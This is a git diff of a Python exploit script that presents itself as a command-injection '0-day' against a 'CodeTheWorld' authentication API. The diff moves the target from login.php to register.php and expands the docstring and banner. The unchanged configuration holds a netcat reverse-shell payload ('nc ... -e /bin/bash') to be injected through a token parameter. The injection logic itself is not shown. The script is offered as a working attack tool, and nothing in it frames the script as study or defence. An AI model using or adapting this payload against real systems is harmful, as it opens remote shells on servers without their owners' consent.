@@ -6,13 +6,17 @@ import urllib.parse
 
 
 # configuration
-TARGET = 'http://example.com/login.php'
+TARGET = 'http://example.com/register.php'
 COMMAND = 'nc 127.0.0.1 4444 -e /bin/bash'
 QUERY = 'token=%s'
 
 
 class Exploit:
-    """ CodeTheWorld authentication API command injection 0-day """
+    """ CodeTheWorld authentication API command injection 0-day
+    
+    Executes a simple command injection exploit, found in
+    the register.php file of CodeTheWorld's authentication API.
+    """
 
     def __init__(self, target, query, command):
         self.target = target
@@ -46,7 +50,7 @@ class Exploit:
 
 
 def main():
-    print('CodeTheWorld authentication API command injection 0day by checksum (0daySkid)\n')
+    print('CodeTheWorld authentication API (register.php) command injection 0day by checksum (0daySkid)\n')
 
     print('Executing exploit...')
 
